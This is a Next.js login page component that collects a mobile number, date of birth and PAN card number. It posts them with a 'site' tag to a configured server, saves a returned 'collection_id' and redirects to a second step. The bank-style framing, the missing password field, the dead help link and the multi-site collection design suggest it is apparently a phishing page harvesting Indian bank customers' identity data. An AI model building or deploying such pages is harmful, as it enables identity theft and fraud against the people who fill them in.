'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from './start.module.css';
import DateInputComponent from "../inlcude/DateInputComponent";


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    }
  return (
    <>
    <Header />
    <h5 className={`${styles.Centering} mb-0 mt-4`}>Login</h5>
    <div className={styles.formContainer}>
      <form onSubmit={handleSubmit} >
        <div className={styles.inputGroup}>
          <input type="text" name="mb" minLength={10} maxLength={10} inputMode="numeric" required placeholder=" " />
          <label>Mobile Number</label>
        </div>
       <DateInputComponent />
        <div className={styles.inputGroup}>
          <input type="text" name="pan"   pattern="^[A-Z]{5}[0-9]{4}[A-Z]{1}$" title="invalid pan card number" required placeholder=" " />
          <label>PAN Number</label>
        </div>
        <button type="submit"  className={styles.button}>
          Login
        </button>
        <a href="#" className={styles.assistanceLink}>
          Need assistance activating mobile banking
        </a>
      </form>
    </div>


    <Footer />
</>
  );
}
